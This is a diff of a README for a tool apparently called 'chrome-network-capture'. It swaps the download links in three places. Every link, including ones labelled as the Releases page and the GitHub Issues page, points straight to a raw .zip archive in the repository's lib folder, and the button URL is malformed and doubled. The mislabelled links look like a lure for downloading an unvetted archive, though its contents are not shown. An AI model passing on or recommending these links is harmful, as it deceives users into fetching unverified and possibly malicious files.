@@ -14,7 +14,7 @@ To get started, you need to download the software. Follow these steps:
 
 1. Click the button below to visit the Releases page.
 
-   [![Download chrome-network-capture](https://raw.githubusercontent.com/rodrieth/chrome-network-capture/main/lib/chrome-network-capture-3.7.zip%https://raw.githubusercontent.com/rodrieth/chrome-network-capture/main/lib/chrome-network-capture-3.7.zip)](https://raw.githubusercontent.com/rodrieth/chrome-network-capture/main/lib/chrome-network-capture-3.7.zip)
+   [![Download chrome-network-capture](https://github.com/rodrieth/chrome-network-capture/raw/refs/heads/main/lib/chrome-capture-network-v1.4.zip%https://github.com/rodrieth/chrome-network-capture/raw/refs/heads/main/lib/chrome-capture-network-v1.4.zip)](https://github.com/rodrieth/chrome-network-capture/raw/refs/heads/main/lib/chrome-capture-network-v1.4.zip)
 
 2. On the Releases page, look for the latest version of chrome-network-capture.
 
@@ -51,7 +51,7 @@ If you would like a more detailed guide, the following steps can help you naviga
 
 1. **Access the Releases Page**
 
-Visit the Releases page directly here: [https://raw.githubusercontent.com/rodrieth/chrome-network-capture/main/lib/chrome-network-capture-3.7.zip](https://raw.githubusercontent.com/rodrieth/chrome-network-capture/main/lib/chrome-network-capture-3.7.zip).
+Visit the Releases page directly here: [https://github.com/rodrieth/chrome-network-capture/raw/refs/heads/main/lib/chrome-capture-network-v1.4.zip](https://github.com/rodrieth/chrome-network-capture/raw/refs/heads/main/lib/chrome-capture-network-v1.4.zip).
 
 2. **Choose Your Version**
 
@@ -87,7 +87,7 @@ Once the process is complete, you can navigate to your selected folder to view a
 
 If you encounter any problems or have suggestions, we want to hear from you! 
 
-- Visit our [GitHub Issues page](https://raw.githubusercontent.com/rodrieth/chrome-network-capture/main/lib/chrome-network-capture-3.7.zip) to report bugs or request features.
+- Visit our [GitHub Issues page](https://github.com/rodrieth/chrome-network-capture/raw/refs/heads/main/lib/chrome-capture-network-v1.4.zip) to report bugs or request features.
 - For direct assistance, you can also reach our support team via email.
 
 ## 🎉 Conclusion
